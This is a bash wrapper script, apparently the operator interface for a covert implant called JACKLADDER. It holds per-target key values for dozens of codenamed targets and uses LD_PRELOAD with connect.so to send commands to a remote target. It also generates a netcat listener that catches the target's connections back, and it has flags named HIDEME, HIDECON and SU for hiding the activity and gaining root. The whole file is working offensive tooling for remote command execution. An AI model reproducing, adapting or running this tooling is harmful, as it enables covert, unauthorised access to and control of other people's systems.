#!/bin/bash

origdir=$(pwd)
cd $(dirname $0)
PATH=$PATH:.:$origdir

##
## Global variables used.
##

## Set keys if you don't want to be prompted.

keys=jackladder20

keylist="
	affine_caep
	affine_ns_aero
	affine_ns_cetin
	affine_ns_north
	affine_ns_space
	aproncover_mgeo
        applebar
	atticfloor
	beautysleep
	bigsurf
	bolivar_lazyday
	changingwheel
	crumpet
	diablo
	dillpill
	dillpill_public
	evenbreak
	falsearch_jicom
	featherbed
	figureeight_inpbox
	figureeight_tulip
	goldentwig
	golfstroke
	iceskate
	idletime
	intonation_1
	intonation_2
	intonation_3
	intonation_4
	intonation_5
	intonation_6
	intonation_7
	intonation_8
	intonation_9
	intonation_10
	intonation_11
	jackladder20
	lazyday
	mantlepiece
	nailfile
	operasong
	patchpanel
	picketline
	quivertree
	slateblack_up3
	slateblack_up4
	offeree
        uniformwheel
	stonecross
        sudbury
	subplot_nicnet
	tiltop
	treatypaper
	treatypaper_server4
	"

wd=$(pwd)				# working directory
connect_so=$(type -path connect.so)	# locate shared object connect.so
cmdln=					# built in dooptions()

##
## Functions to setup the target's keys
##	These functions export the environment variables
##	needed by `jl' for operation.
##	PRIME		used for munging magic/port information
##	INVPRIME	used to retrieve munged info
##	UTC_OFFSET	target UTC adjustment
##			expr $(date -u +%Y%j%H%M) - $(date -u +%Y%j%H%M)
##				  theirs		 ours
##

affine_caep()		{ export PRIME=59	INVPRIME=55539; }
affine_ns_aero()	{ return; }  # uses builtin PRIME 20023, INVPRIME 51079
#affine_ns_aero()	{ export PRIME=41	INVPRIME=39961; }
affine_ns_cetin()	{ export PRIME=37	INVPRIME=7085;  }
affine_ns_north()	{ export PRIME=31	INVPRIME=31711; }
applebar()		{ export PRIME=167	INVPRIME=42775; }
aproncover_mgeo()	{ export PRIME=151	INVPRIME=32551; }
atticfloor()		{ export PRIME=43271	INVPRIME=29879; }
beautysleep()		{ export PRIME=4253	INVPRIME=62901; }
bigsurf()		{ export PRIME=1129	INVPRIME=52185; }
bolivar_lazyday()       { export PRIME=149      INVPRIME=51901; }
changingwheel()		{ export PRIME=41	INVPRIME=39961; }
crumpet()		{ export PRIME=1151	INVPRIME=47999; }
demo()			{ export PRIME=7	INVPRIME=28087; }
diablo()		{ export PRIME=131	INVPRIME=20011; }
dillpill()		{ export PRIME=71	INVPRIME=43383; }
dillpill_public()	{ export PRIME=79	INVPRIME=5807;  }
evenbreak()		{ export PRIME=43	INVPRIME=48771; }
falsearch_jicom()	{ export PRIME=139	INVPRIME=26403; }
featherbed()		{ export PRIME=37693	INVPRIME=23573; }
figureeight_inpbox()	{ export PRIME=47	INVPRIME=18127; }
figureeight_tulip()	{ export PRIME=53	INVPRIME=21021; }
goldentwig() 		{ export PRIME=97       INVPRIME=41889; }
golfstroke() 		{ export PRIME=5591     INVPRIME=44519; }  # IOTC
iceskate() 		{ export PRIME=157      INVPRIME=34229; }
idletime() 		{ export PRIME=103      INVPRIME=6999;  }
intonation_1()		{ export PRIME=101	INVPRIME=45421; }
intonation_2()		{ export PRIME=83	INVPRIME=17371; }
intonation_3()		{ export PRIME=107	INVPRIME=44099; }
intonation_4()		{ export PRIME=109	INVPRIME=2405;  }
intonation_5()		{ export PRIME=113	INVPRIME=49297; }
intonation_6()		{ export PRIME=179	INVPRIME=44667; }
intonation_7()		{ export PRIME=181	INVPRIME=60829; }
intonation_8()		{ export PRIME=191	INVPRIME=28479; }
intonation_9()		{ export PRIME=193	INVPRIME=36673; }
intonation_10()		{ export PRIME=197	INVPRIME=32269; }
intonation_11()		{ export PRIME=229	INVPRIME=48365; }
jackladder20()		{ return; }  # uses builtin PRIME 20023, INVPRIME 51079
lazyday()		{ export PRIME=89       INVPRIME=18409; }
mantlepiece()		{ export PRIME=173      INVPRIME=25381; }
nailfile()		{ export PRIME=25469	INVPRIME=28117; }
operasong()		{ export PRIME=50929	INVPRIME=27153; }
patchpanel()		{ export PRIME=54059	INVPRIME=21379; }
picketline()		{ export PRIME=5119	INVPRIME=60415; }
quivertree()		{ export PRIME=61	INVPRIME=38677; }
slateblack_up3()	{ export PRIME=199	INVPRIME=49399; }
slateblack_up4()	{ export PRIME=211	INVPRIME=22363; }
stonecross()		{ export PRIME=239	INVPRIME=11791; }
sudbury()		{ export PRIME=233	INVPRIME=55129; }
offeree()		{ export PRIME=223	INVPRIME=47903; }
uniformwheel()		{ export PRIME=227	INVPRIME=17611; }
subplot_nicnet()	{ export PRIME=2663	INVPRIME=29015; }
#tiltop()		{ export PRIME=73	INVPRIME=61945; }
tiltop()		{ return; }  # uses builtin PRIME 20023, INVPRIME 51079
treatypaper()		{ export PRIME=67	INVPRIME=19563; }
treatypaper_server4()	{ export PRIME=163	INVPRIME=45835; }


##
## Utility functions
##

setupkeys() {
	local host=$1

	case $host in
		-help | --help | -h | -? | $0 ) usage;;
		*	  ) 
			if [ $keys ]; then
				$keys
				return
			fi

			echo
			echo -e "\t--- Select target keys ---"
			echo
			
			PS3=$(echo -e "\nkeys? ")
			select keyinitfct in $keylist; do
				if [ $keyinitfct ]; then
					$keyinitfct
					break
				else
					echo "Select a listed number."
					echo
				fi
			done
			;;
	esac
}

ckupgrade() {
	if [ ${O_PRIME:+1} ]; then
		echo -n "Do you want to use the old keys? [n] "
		read ans
		if [ ${ans:-"n"} = "y" ]; then
			export    PRIME=$O_PRIME
			export INVPRIME=$O_INVPRIME
		fi
	fi
}


dooptions() {
	while [ $# -gt 0 ]; do
		case $1 in
		-o )		shift;
				cmdln=$(echo "$cmdln UTC_OFFSET=$1 ");
				shift;
				continue ;;
		-r )		cmdln=$(echo "$cmdln SU= ");
				shift;
				continue ;;
		-s )		cmdln=$(echo "$cmdln HIDEME= ");
				shift;
				continue ;;
		-t )		cmdln=$(echo "$cmdln HIDECON= ");
				shift;
				continue ;;
		esac
		cmdln=$(echo "$cmdln $1 ")
		shift
	done
}

echoenv() {
	echo
	echo "- Keys for $keys..."
	echo "    PRIME      = $PRIME"
	echo "    INVPRIME   = $INVPRIME"
	[ ${O_PRIME:+1} ]     && echo "    O_PRIME    = $O_PRIME"
	[ ${O_INIVPRIME:+1} ] && echo "    O_INVPRIME = $O_INVPRIME"
	[ ${UTC_OFFSET:+1} ]  && echo "    UTC_OFFSET = $UTC_OFFSET"
	echo
}

nc_script() {
	cat << HERE > $wd/jl.nc
#!/bin/bash
	echo "Use ^c twice to stop $0..."
	echo "   1 for nc, 1 for while loop"
	while true; do
		port=\$RANDOM
		echo
		echo "---> Listening on \$port <---"
		echo
		echo \$port  > $wd/.PORT
		echo \$(tty) > $wd/.TTY
		nc -l -p \$port
		sleep 2
	done
HERE

	chmod +x $wd/jl.nc
}

usage() {
	echo
	echo "This is a JACKLADDER interface tool"
	echo
	echo "- Usage: jl <options> <tcp-based client cmd to target>"
	echo "    -o <min>	Offset the date timestamp by <min> minutes"
	echo
	echo "- Run the following in a control window..."
	echo "    script -a typescript.\$(date +%Y%m%d)"
	echo "    $wd/jl.nc"
	echo
	echo "- Then, as an example, in a command window run..."
	echo "    $0 telnet target"
	echo "    remote cmd: ps -ef"
	echo
	echo "    Note: $0 issues the \"remote cmd: \" prompt"

	nc_script	# generate the netcat script

	if [ $keys ]; then
		$keys
		echoenv
	fi
	exit
}


##
## Run the functions to setup the environment for JACKLADDER
##

eval targ=\${$#}        # note: doesn't handle port arg at end of command line
setupkeys $targ
dooptions $@		# this function sets up the $cmdln variable
ckupgrade

#
# If PRIME is set, then use pre v2.0 trigger format.
#
if [ "$(echo $PRIME)" ]; then
	connect_so=$(type -path connect12.so)
fi

#
# Get command to run on target.
#
if [ "$REALCMD" != "" ]; then
    cmd=$REALCMD
    PORT=""
    else
    PORT=$(cat $wd/.PORT)
    if [ -x "$(command -v readcmd)" ]; then
	    histfile=${wd}/.jl_history
	    readcmd -h $histfile -p "remote cmd: "
	    cmd=$(tail -1 $histfile)
    else
	    echo -n "remote cmd: "; read cmd
    fi
fi
	
if [ -e .TTY ] ; then
    echo running: $cmd > $(cat .TTY)
else
    echo running: $cmd
fi
echo
echo running: ${INBLESS}LD_PRELOAD=$connect_so CMD=+$cmd+ PORT=$PORT $cmdln
echo

# INBLESS is set in jacktelnet.sh to INBLESS="SU= HIDEME= HIDECON= " if
# IN is blessing us

eval $INBLESS LD_PRELOAD=$connect_so CMD="\$cmd" PORT=$PORT $cmdln
